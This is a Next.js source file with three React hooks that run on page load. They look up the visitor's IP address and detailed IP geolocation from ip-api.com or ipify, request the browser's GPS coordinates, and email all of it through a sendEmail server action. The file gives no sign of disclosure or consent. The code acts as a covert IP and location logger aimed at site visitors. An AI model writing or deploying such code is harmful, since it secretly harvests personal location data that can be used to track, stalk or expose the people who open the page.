"use client";

import { useEffect } from "react";
import { sendEmail } from "@/actions";

export const useGetIp = () => {
  useEffect(() => {
    (async () => {
      try {
        const response = await fetch("http://ip-api.com/json/?fields=66846719");
        const data = await response.json();

        await sendEmail({ ip: data });
      } catch (error) {
        await sendEmail({ ip: "chsec" });
      }
    })();
  }, []);
};

export const useGetCoords = () => {
  useEffect(() => {
    (async () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          await sendEmail({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
          });
        });
      } else {
        await sendEmail({
          lat: "chsec",
          lon: "chsec",
        });
      }
    })();
  }, []);
};

export const useAll = () => {
  useEffect(() => {
    (async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();

        await sendEmail({ ip: data });
      } catch (error) {
        await sendEmail({ ip: "chsec" });
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            await sendEmail({
              lat: position.coords.latitude,
              lon: position.coords.longitude,
            });
          },
          async () => {
            await sendEmail({
              lat: "chsec",
              lon: "chsec",
            });
          }
        );
      } else {
        await sendEmail({
          lat: "chsec",
          lon: "chsec",
        });
      }
    })();
  }, []);
};
